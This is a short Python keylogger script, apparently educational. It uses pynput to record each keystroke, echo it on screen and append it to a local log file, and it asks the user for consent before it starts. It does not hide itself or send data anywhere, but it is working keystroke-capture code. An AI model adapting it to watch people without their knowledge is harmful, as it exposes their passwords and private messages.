

from pynput import keyboard
from datetime import datetime
import sys

LOG_FILE = "keylog.txt"

def write_log(data):
    try:
        with open(LOG_FILE, 'a') as log:
            log.write(data)
    except Exception as e:
        print(f"An Error Occurred: {e}")

def on_key_press(key):
    key = str(key)

    if key == 'Key.space':
        key = ' '
    elif key == 'Key.enter':
        key = '\n'
    elif key.startswith('Key'):
        key = f' [{key}] '

    print(key)
    write_log(key)

def start_keylogger():
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    write_log(f"\n\nLogging started at {current_time}\n")

    print("Keylogging started... (Press Ctrl+C to stop)")
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

def get_user_consent():
    print("⚠️ Ethical Notice ⚠️")
    print("This program logs keystrokes for EDUCATIONAL PURPOSES only.")
    print("It should be used only with the user's full knowledge and consent.\n")

    choice = input("Do you agree to proceed? (Y/N): ").strip().lower()
    if choice != 'y':
        print("Consent not given. Program terminated.")
        sys.exit()

if __name__ == "__main__":
    get_user_consent()
    start_keylogger()

